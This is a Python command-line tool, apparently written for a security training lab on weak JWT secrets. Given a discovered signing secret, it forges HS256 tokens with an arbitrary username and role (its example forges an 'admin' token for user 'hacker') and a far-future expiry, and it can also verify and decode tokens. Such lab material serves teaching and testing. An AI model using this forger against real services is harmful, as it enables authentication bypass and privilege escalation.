#!/usr/bin/env python3
"""
JWT Forging Tool for L11 Lab - Weak JWT Secret

Forge JWT tokens once you've discovered the secret.
"""

import argparse
import base64
import hmac
import hashlib
import json
import sys


def base64url_encode(data):
    """Base64URL encode without padding"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data):
    """Base64URL decode with padding"""
    padding = 4 - (len(data) % 4)
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def forge_jwt(username, role, secret, exp=9999999999):
    """Forge a JWT token with the given username and role"""
    header = {"alg": "HS256", "typ": "JWT"}
    payload = {"user": username, "role": role, "exp": exp}

    encoded_header = base64url_encode(json.dumps(header, separators=(',', ':')))
    encoded_payload = base64url_encode(json.dumps(payload, separators=(',', ':')))

    message = f"{encoded_header}.{encoded_payload}"
    signature = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hashlib.sha256).digest()
    encoded_signature = base64url_encode(signature)

    return f"{encoded_header}.{encoded_payload}.{encoded_signature}"


def verify_jwt(token, secret):
    """Verify a JWT token signature"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return False

        encoded_header, encoded_payload, provided_signature = parts
        message = f"{encoded_header}.{encoded_payload}"
        expected_signature = hmac.new(secret.encode('utf-8'), message.encode('utf-8'), hashlib.sha256).digest()
        return provided_signature == base64url_encode(expected_signature)
    except Exception:
        return False


def decode_jwt(token):
    """Decode a JWT token without verification"""
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None

        header = json.loads(base64url_decode(parts[0]))
        payload = json.loads(base64url_decode(parts[1]))
        return {"header": header, "payload": payload, "signature": parts[2]}
    except Exception:
        return None


def main():
    parser = argparse.ArgumentParser(
        description='JWT Forging Tool for L11 Lab',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  %(prog)s forge --secret <SECRET> --user hacker --role admin
  %(prog)s verify --secret <SECRET> --token <TOKEN>
  %(prog)s decode --token <TOKEN>
''')
    subparsers = parser.add_subparsers(dest='command', required=True)

    # Forge command
    forge_parser = subparsers.add_parser('forge', help='Forge a new JWT token')
    forge_parser.add_argument('--secret', '-s', required=True, help='JWT signing secret')
    forge_parser.add_argument('--user', '-u', required=True, help='Username for token')
    forge_parser.add_argument('--role', '-r', required=True, help='Role (e.g., user, admin)')
    forge_parser.add_argument('--exp', '-e', type=int, default=9999999999, help='Expiration timestamp')

    # Verify command
    verify_parser = subparsers.add_parser('verify', help='Verify a JWT token')
    verify_parser.add_argument('--secret', '-s', required=True, help='JWT signing secret')
    verify_parser.add_argument('--token', '-t', required=True, help='JWT token to verify')

    # Decode command
    decode_parser = subparsers.add_parser('decode', help='Decode a JWT token (no verification)')
    decode_parser.add_argument('--token', '-t', required=True, help='JWT token to decode')

    args = parser.parse_args()

    if args.command == 'forge':
        token = forge_jwt(args.user, args.role, args.secret, args.exp)
        print(token)

    elif args.command == 'verify':
        valid = verify_jwt(args.token, args.secret)
        print(f"Valid: {valid}")
        if valid:
            decoded = decode_jwt(args.token)
            if decoded:
                print(f"User: {decoded['payload'].get('user')}")
                print(f"Role: {decoded['payload'].get('role')}")

    elif args.command == 'decode':
        decoded = decode_jwt(args.token)
        if decoded:
            print(json.dumps(decoded, indent=2))
        else:
            print("Failed to decode token", file=sys.stderr)
            sys.exit(1)


if __name__ == "__main__":
    main()

